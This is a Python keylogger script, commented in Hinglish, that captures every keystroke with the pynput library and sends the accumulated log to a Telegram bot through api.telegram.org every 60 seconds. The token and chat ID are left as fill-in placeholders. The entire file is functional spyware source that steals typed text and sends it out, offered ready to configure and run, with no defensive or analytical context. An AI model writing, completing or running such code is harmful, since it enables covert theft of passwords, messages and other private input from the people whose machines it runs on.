import requests
from pynput import keyboard
import threading

# -------------------------------
# CONFIGURATION
# -------------------------------
TELEGRAM_BOT_TOKEN = "Enter You Token"  # @BotFather se liya token
CHAT_ID = "Enter Your Chat ID"              # getUpdates se liya chat id
SEND_INTERVAL = 60                    # Har 60 seconds pe logs bheje

# -------------------------------
# KEYLOGGER CLASS
# -------------------------------
class KeyLogger:
    def __init__(self, interval, bot_token, chat_id):
        self.interval = interval
        self.bot_token = bot_token
        self.chat_id = chat_id
        self.log = ""
        self.start()

    def append_to_log(self, string):
        self.log += string

    def on_press(self, key):
        try:
            if hasattr(key, 'char') and key.char:
                self.append_to_log(key.char)
            elif key == keyboard.Key.space:
                self.append_to_log(" ")
            elif key == keyboard.Key.enter:
                self.append_to_log("\n")
        except AttributeError:
            pass

    def send_telegram_message(self, message):
        url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
        data = {"chat_id": self.chat_id, "text": message}
        try:
            response = requests.post(url, data=data)
            if response.status_code == 200:
                print("[+] Log sent to Telegram.")
            else:
                print(f"[!] Failed to send log: {response.text}")
        except Exception as e:
            print(f"[!] Error sending Telegram message: {e}")

    def report(self):
        if self.log:
            self.send_telegram_message(f"[Keylogger Report]\n{self.log}")
            self.log = ""  # Clear after sending
        threading.Timer(self.interval, self.report).start()

    def start(self):
        print("[+] Keylogger started. Press Ctrl+C to stop.")
        listener = keyboard.Listener(on_press=self.on_press)
        listener.start()
        self.report()

# -------------------------------
# MAIN FUNCTION
# -------------------------------
if __name__ == "__main__":
    KeyLogger(interval=SEND_INTERVAL, bot_token=TELEGRAM_BOT_TOKEN, chat_id=CHAT_ID)
